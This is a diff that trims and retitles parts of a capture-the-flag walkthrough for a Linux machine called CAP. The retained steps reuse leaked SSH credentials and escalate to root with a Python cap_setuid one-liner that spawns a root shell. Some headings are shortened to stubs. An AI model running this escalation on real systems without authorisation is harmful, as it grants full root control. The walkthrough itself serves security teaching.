@@ -184,11 +184,7 @@ We reuse credentials:
 ```bash
 ssh nathan@<IP>
 ```
-
-### Result
-
-- Successful login  
-- User shell obtained  
+User shell obtained  
 
 ---
 
@@ -203,18 +199,6 @@ cat user.txt
 ---
 
 # 9. Privilege Escalation
-
-### Enumeration Tool
-
-Run:
-
-```bash
-linpeas
-```
-
----
-
-### Discovery
 
 Using:
 
@@ -237,7 +221,7 @@ python3.8 = cap_setuid+ep
 
 ---
 
-# 10. Understanding the Vulnerability
+# 10.
 
 ### What is cap_setuid?
 
@@ -269,7 +253,7 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 ---
 
-### Explanation
+### code
 
 - `os.setuid(0)`  Switch to root user  
 - `os.system("/bin/sh")`  Spawn shell  
@@ -300,8 +284,7 @@ cat /root/root.txt
 
 ---
 
-# 13. Attack Chain Summary
-
+# 13. Attack
 ```
 VPN Connection
  DNS Mapping (/etc/hosts)
@@ -318,7 +301,7 @@ VPN Connection
 
 ---
 
-# 14. Key Takeaways
+# 14. Vulnerabilites
 
 ### 1. IDOR Vulnerability
 
@@ -345,17 +328,3 @@ VPN Connection
 
 - Fine-grained privilege system  
 - Misuse can lead to full root compromise  
-
----
-
-# Conclusion
-
-The CAP machine demonstrates a realistic attack path:
-
-- Web vulnerability (IDOR)
-- Credential leakage
-- Privilege escalation via Linux capabilities  
-
-A strong reminder that:
-
-> Even small misconfigurations can lead to full system compromise.
